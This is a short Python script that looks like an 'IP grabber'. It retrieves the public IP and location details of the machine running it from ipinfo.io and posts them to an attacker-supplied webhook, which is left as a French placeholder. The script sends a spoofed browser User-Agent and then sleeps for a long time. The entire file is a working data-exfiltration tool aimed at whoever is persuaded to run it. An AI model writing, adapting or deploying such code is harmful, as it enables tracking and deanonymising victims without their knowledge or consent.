from json import dumps
from requests import get, post
import time
import logging
import os
import re
import json
from urllib.request import Request, urlopen
headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
WEBHOOK_URL = 'ENTRE TON WEBHOOK'

IP = get("https://ipinfo.io/").text
print(IP)
print(logging.info)

payload = json.dumps({'content': IP})

req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
urlopen(req)
time.sleep(1000)
